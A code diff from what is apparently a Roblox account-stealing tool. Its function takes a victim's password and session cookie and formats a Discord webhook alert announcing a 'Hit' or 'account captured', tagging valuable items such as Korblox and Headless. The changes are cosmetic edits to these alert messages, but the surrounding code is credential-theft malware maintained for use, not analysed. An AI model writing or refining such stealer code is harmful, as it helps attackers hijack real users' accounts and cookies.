@@ -68,7 +68,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                 ping_content = '@everyone 📈 **Normal Hit** - Account has spending history'
             else:
                 # No ping for accounts with no spending and no premium items
-                ping_content = '@everyone 🎯 **Hit Received** - Basic account captured'
+                ping_content = '@everyone Hit'
         
         # Prepare cookie content for Discord (use cookie as provided)
         cookie_content = cookie if cookie else 'Not provided'
@@ -126,12 +126,12 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'inline': False
                         },
                         {
-                            'name': '👑 Korblox',
+                            'name': '<:korblox:1153613134599307314>Korblox',
                             'value': '✅' if korblox else '❌',
                             'inline': False
                         },
                         {
-                            'name': '💀 Headless',
+                            'name': '<:head_full:1207367926622191666>Headless',
                             'value': '✅' if headless else '❌',
                             'inline': False
                         },
